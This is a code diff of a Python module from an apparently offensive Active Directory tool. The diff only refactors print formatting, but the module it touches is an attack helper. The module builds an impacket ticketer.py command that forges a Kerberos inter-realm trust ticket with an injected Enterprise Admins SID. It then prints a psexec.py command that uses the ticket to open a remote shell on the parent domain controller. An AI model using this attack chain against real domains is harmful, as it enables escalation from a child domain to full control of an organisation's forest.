@@ -1,5 +1,4 @@
-"""Inter-realm trust ticket — forge referral tickets for cross-domain access."""
-from __future__ import annotations
+"""Inter-realm trust ticket  -  forge referral tickets for cross-domain access."""
 import sys
 from typing import Any
 
@@ -33,19 +32,17 @@ def run(args: Any) -> int:
     extra_sid = "{}-519".format(parent_sid or "<parent-SID>")
 
     print("[*] Inter-realm trust ticket:")
-    print("  Child domain:  {} ({})".format(child_domain, child_sid))
+    print(f"  Child domain:  {child_domain} ({child_sid})")
     print("  Parent domain: {} ({})".format(parent_domain, parent_sid or "?"))
-    print("  Trust key:     {}...".format(trust_key[:16]))
-    print("  Extra SID:     {} (Enterprise Admins)".format(extra_sid))
-    print("  Impersonate:   {}".format(impersonate))
+    print(f"  Trust key:     {trust_key[:16]}...")
+    print(f"  Extra SID:     {extra_sid} (Enterprise Admins)")
+    print(f"  Impersonate:   {impersonate}")
 
     print("\n[*] Forge command:")
-    print("  ticketer.py -nthash {} -domain-sid {} "
-          "-domain {} -extra-sid {} -spn krbtgt/{} {}".format(
-              trust_key, child_sid, child_domain,
-              extra_sid, parent_domain, impersonate))
+    print(f"  ticketer.py -nthash {trust_key} -domain-sid {child_sid} "
+          f"-domain {child_domain} -extra-sid {extra_sid} -spn krbtgt/{parent_domain} {impersonate}")
 
     print("\n[*] Then use the ticket:")
-    print("  export KRB5CCNAME={}.ccache".format(impersonate))
-    print("  psexec.py -k -no-pass {}@dc.{}".format(impersonate, parent_domain))
+    print(f"  export KRB5CCNAME={impersonate}.ccache")
+    print(f"  psexec.py -k -no-pass {impersonate}@dc.{parent_domain}")
     return 0
